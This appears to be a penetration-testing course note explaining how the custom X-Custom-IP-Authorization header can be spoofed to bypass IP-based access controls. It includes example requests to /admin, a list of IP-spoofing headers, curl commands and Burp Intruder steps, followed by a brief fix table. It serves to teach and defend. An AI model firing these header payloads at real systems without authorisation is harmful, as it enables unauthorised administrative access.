---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.08 X-Custom-IP-Authorization — WAF/Access Bypass"
---

# 03.08 — X-Custom-IP-Authorization

## What is it?

`X-Custom-IP-Authorization` is not a standard HTTP header — it's a header some custom applications or WAFs use internally for IP-based access control. If an app reads this header to determine the requester's IP (instead of using the actual TCP connection IP), an attacker can spoof it.

It represents a class of custom IP headers that applications sometimes invent for internal use.

---

## Why This Exists

```
LEGITIMATE USE (internal microservices):
  Internal load balancer sets X-Custom-IP-Authorization: 10.10.1.5
  Backend service reads this to know which internal service called it
  
PROBLEM:
  External requests also flow through the same path!
  Attacker can set this header to any IP they want!
```

---

## Attack: IP Spoofing for Access Bypass

```
REQUEST (normal — blocked):
  GET /admin HTTP/1.1
  Host: target.com
  → 403 Forbidden

ATTACK:
  GET /admin HTTP/1.1
  Host: target.com
  X-Custom-IP-Authorization: 127.0.0.1   → admin access!

  OR if internal IP range is trusted:
  X-Custom-IP-Authorization: 10.0.0.1
  X-Custom-IP-Authorization: 192.168.1.1
```

---

## Full List of IP Bypass Headers to Try

```bash
# Try all of these simultaneously or one by one:
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
Forwarded: for=127.0.0.1
X-Cluster-Client-IP: 127.0.0.1
Fastly-Client-IP: 127.0.0.1
```

---

## Testing

```bash
# Try with localhost
curl -H "X-Custom-IP-Authorization: 127.0.0.1" https://target.com/admin

# Try with internal IP ranges
curl -H "X-Custom-IP-Authorization: 10.0.0.1" https://target.com/admin

# Burp Suite Intruder:
# Add X-Custom-IP-Authorization header
# Use IP list as payload (127.0.0.1, 10.0.0.1, 192.168.0.1, etc.)
# Look for 200 response
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| App trusts X-Custom-IP-Authorization | Strip all custom IP headers at perimeter |
| IP-based access control via headers | Use real TCP connection IP ($remote_addr in Nginx) |

---

## Related Notes
- [[02 - X-Forwarded-For]] — most common IP bypass header
- [[05 - X-Real-IP]] — Nginx IP header
- [[10 - True-Client-IP]] — Cloudflare IP header
- [[11 - CF-Connecting-IP]] — Cloudflare header
